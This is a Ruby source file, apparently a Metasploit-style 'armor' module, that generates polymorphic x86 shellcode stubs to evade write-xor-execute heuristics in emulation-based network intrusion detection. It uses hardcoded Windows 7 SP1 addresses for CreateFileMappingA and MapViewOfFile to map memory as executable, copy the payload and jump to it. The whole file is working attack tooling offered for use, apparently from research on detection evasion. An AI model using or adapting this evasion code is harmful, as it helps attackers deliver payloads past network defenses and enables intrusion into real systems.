# -*- coding: binary -*-

# =============================================================
# WX-heuristic evasion armoring classes
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids


  #
  # Class for evasion of WX-based heuristic
  #
  class WXArmor < AntiHeuristicArmor

    def initialize
      super(
        'Name'             => 'WXDualMap',  
        'ID'               => 19,             
        'Description'      => 'DualMapping WX-evasion shellcode',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # Lightly-polymorphic getPC stub to evade WX-based evasion
    #
    # [-] Limitations:
    #      - Currently only works on Windows 7 Ultimate (64-bit) SP1 (EN)
    #
    # [*] Note:
    #      - This can be further improved by better polymorphism
    #      - This can be further improved by supporting more platforms
    #
    def getPCStub(getPCDestReg)

      badchars = @module_metadata['badchars']

      # Hardcoded CreateFileMappingA address on Windows 7 Ultimate (64-bit) SP1 (EN)
      createFileMappingA = 0x759554ce
      # Hardcoded MapViewOfFile address on Windows 7 Ultimate (64-bit) SP1 (EN)
      mapViewOfFile = 0x759518bd

      pageExecReadWriteCommit = 0x08000040
      fileMapReadFileMapWrite = 0x6
      fileMapExecuteFileMapReadFileMapWrite = 0x26

      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]
      gp_regs.shuffle

      reg1 = gp_regs[0]
      reg2 = gp_regs[1]

      payloadSize = @module_metadata['enc'].bytesize

      stub = Rex::Arch::X86.set(reg1, 0, badchars) + 
             Rex::Arch::X86.sub(-payloadSize, reg2, badchars) + # reg2 = payloadSize
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_reg(reg2) + # push payloadSize
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.sub(-pageExecReadWriteCommit, reg2, badchars) + # reg2 = pageExecReadWriteCommit
             Rex::Arch::X86.push_reg(reg2) + # pageExecReadWriteCommit
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_byte(-1) + # INVALID_HANDLE_VALUE
             Rex::Arch::X86.mov_dword(reg2, createFileMappingA) + # reg2 = createFileMappingA
             Rex::Arch::X86.call_reg(reg2) # call CreateFileMappingA

      # reshuffle regs

      gp_regs = gp_regs - Array[Rex::Arch::X86::EAX]
      gp_regs.shuffle

      reg1 = gp_regs[0]
      reg2 = gp_regs[1]

      stub = stub + Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) + # push result of CreateFileMappingA
             Rex::Arch::X86.set(reg1, 0, badchars) + 
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_byte(fileMapReadFileMapWrite) + # AccessMode = FILE_MAP_READ | FILE_MAP_WRITE
             Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) + # push result of CreateFileMappingA
             Rex::Arch::X86.mov_dword(reg2, mapViewOfFile) + # reg2 = mapViewOfFile
             Rex::Arch::X86.call_reg(reg2) # call mapViewOfFile

      # reshuffle regs
      gp_regs.shuffle

      reg1 = gp_regs[0]
      reg2 = gp_regs[1]

      stub = stub + Rex::Arch::X86.pop_dword(reg2) + # pop result of CreateFileMappingA
             Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) + # push result of MapViewOfFile
             Rex::Arch::X86.set(reg1, 0, badchars) + 
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_reg(reg1) +
             Rex::Arch::X86.push_byte(fileMapExecuteFileMapReadFileMapWrite) + # AccessMode = FILE_MAP_EXECUTE | FILE_MAP_READ | FILE_MAP_WRITE
             Rex::Arch::X86.push_reg(reg2) + # push result of CreateFileMappingA
             Rex::Arch::X86.mov_dword(reg2, mapViewOfFile) + # reg2 = mapViewOfFile
             Rex::Arch::X86.call_reg(reg2) # call mapViewOfFile

      stubFinal = "\xF3\xA4" + # REP MOVSB
             Rex::Arch::X86.mov_reg(getPCDestReg, Rex::Arch::X86::EAX) + # getPCDestReg = EAX
             Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(getPCDestReg)) # execute code, getPCDestReg = PC

      stub = stub + Rex::Arch::X86.pop_dword(Rex::Arch::X86::EDI) + # pop result of first MapViewOfFile to EDI
             Rex::Arch::X86.sub(-payloadSize, Rex::Arch::X86::ECX, badchars) + # ECX = payloadSize
             # PC to ESI
             "\x68" + Ebnids::GetPCStub.stackGetPC(Rex::Arch::X86::ESI, badchars) + # push (getPC_Stub)
             Rex::Arch::X86.call_reg(Rex::Arch::X86::ESP) + # call ESP
             # adjust
             Rex::Arch::X86.sub(-(stubFinal.bytesize + 3), Rex::Arch::X86::ESI, badchars, false, true) + # ESI += size of stub till appended payload
             # final
             stubFinal             

      return stub
    end

  end


end
